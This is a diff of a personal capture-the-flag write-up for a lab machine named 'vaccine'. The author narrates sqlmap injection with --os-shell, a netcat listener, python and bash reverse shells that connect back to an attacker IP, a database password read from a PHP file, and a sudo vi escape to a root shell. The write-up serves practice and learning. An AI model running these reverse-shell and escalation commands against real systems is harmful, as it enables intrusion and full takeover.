@@ -370,7 +370,7 @@ I was supposed to use `--os-shell`.
 
 ## `--os-shell`
 
-    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg" --os-shell
+    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg" --os-shell --random-agent
 
 Great!
 
@@ -391,8 +391,126 @@ Attacker runs:
 
 Victim runs:
 
-    python -c 'attackerip="10.10.15.25";attackerport=6969;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((attackerip,attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+    python -c 'attackerip="10.10.15.25";attackerport=6969;print('wew');import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((attackerip,attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 And to upgrade:
 
     python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+## can't upgrade shell
+
+...
+
+Okay, I can't `cd` or run `python -c "print 'lol'"`.
+
+Time to consult the guide again. I don't think that `--os-shell` does exactly what I think it does.
+
+...
+
+Apparently I am supposed to use a reverse shell, but not `python`.
+
+
+Attacker:
+
+    nc -lvp 6969
+
+Victim:
+
+    bash -c 'bash -i >& /dev/tcp/10.10.15.25/6969 0>&1'
+
+Upgrade:
+
+    SHELL=/bin/bash script -q /dev/null
+
+Well, we have a reverse shell.
+
+    postgres@vaccine:/var/lib/postgresql/11/main$ whoami
+    whoami
+    postgres
+
+I'm going to keep reading the guide as to not waste time - There are a lot of things I would never find out on my own.
+
+## /var/www/html
+
+A running theme, at least with PHP apps, is going to `/var/www/html/` folder. The guide says to check here.
+
+## dashboard.php
+
+Line 41:
+
+    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+
+`postgres:P@s5w0rd!`!
+
+If you don't upgrade the shell, you will get an error related to password entry:
+
+    sudo: no tty present and no askpass program specified
+
+According to the guide, we should then run `sudo -l`. WTF is that? Let's run `man sudo`.
+
+Apparently it lists all the allowed commands the current user can run.
+
+    postgres@vaccine:/var/www/html$ sudo -l        
+    sudo -l
+    [sudo] password for postgres: P@s5w0rd!
+
+    Matching Defaults entries for postgres on vaccine:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User postgres may run the following commands on vaccine:
+        (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+So we can run `/bin/vi /etc/postgresql/11/main/pg_hba.conf`.
+
+I had no idea what to do here.
+
+Guide again.
+
+So, `vi` can run commands.
+
+If I run `vi` as root with:
+
+    sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+And then, inside `vi`, type:
+
+    <ESC>:!/bin/bash<ENTER>
+
+I should spawn a root shell. Let's try it.
+
+It worked! See the wonky output below. Line 11. `^[` is `<ESC>`. Below the content of the `/etc/postgresql/11/main/pg_hba.conf` file, you can see shell commands.
+
+
+    # DO NOT DISABLE!
+    # If you change this first entry you will need to make sure that the
+    # database superuser can access the database using some other method.
+    # Noninteractive access to all databases is required during automatic
+    # maintenance (custom daily cronjobs, replication, and similar tasks).
+    #
+    # Database administrative login by Unix domain socket
+
+    # TYPE  DATABASE        USER            ADDRESS                 METHOD
+
+    local   all             postgres                                iden^[:!/bin/bash
+    # "local" is for Unix domain socket connections only
+    local   all             all                                     peer
+    # IPv4 local connections:
+    host    all             all             127.0.0.1/32            md5
+    # IPv6 local connections:
+    host    all             all             ::1/128                 md5
+    # Allow replication connections from localhost, by a user with the
+    # replication privilege.
+    local   replication     all                                     peer
+    host    replication     all             127.0.0.1/32            md5
+    host    replication     all             ::1/128                 md5
+    :!/bin/bash
+    root@vaccine:/var/lib/postgresql/11/main# whoami
+    whoami
+    root
+    root@vaccine:/var/lib/postgresql/11/main# 
+
+In `/root/` you can find the flag.
+
+Still looking for the user flag but I have root for now.
